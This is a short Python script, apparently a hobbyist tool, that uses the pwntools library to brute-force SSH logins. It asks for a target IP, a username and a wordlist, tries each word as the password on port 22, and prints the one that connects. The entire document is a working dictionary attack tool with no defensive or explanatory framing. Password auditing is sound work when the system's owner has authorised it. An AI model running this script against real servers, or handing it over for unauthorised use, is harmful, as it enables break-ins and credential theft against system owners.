from pwn import *
serverip=input('enter ssh server ip: ')
port=22
username=input(f"enter the username for {serverip}: ")
paslist=input('enter the path to wordlist: ')
with open(paslist,'r')as f:
    r=f.read()
    r=r.split('\n')
    for i in r:
        try:
            resp=ssh(host=serverip,user=username,password=i,timeout='1')
            if resp.connected:
                print('connected')
                print(f"{username} password is :{i}")
                break
            else:
                pass

        except Exception:
            pass

        
